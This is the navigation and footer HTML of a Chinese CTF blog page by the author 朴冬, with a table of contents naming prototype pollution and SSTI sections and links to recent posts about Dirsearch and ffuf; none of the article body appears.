href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96flag%E5%A4%A7%E8%87%B4%E8%B7%AF%E5%BE%84%E7%9A%84"><span class="toc-number">1.</span> <span class="toc-text">获取flag大致路径的</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%A0%E6%88%90%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%A4%84"><span class="toc-number">2.</span> <span class="toc-text">造成原型链污染处</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%E5%A4%84"><span class="toc-number">3.</span> <span class="toc-text">SSTI处</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI-Waf%E5%A4%84"><span class="toc-number">4.</span> <span class="toc-text">SSTI Waf处</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
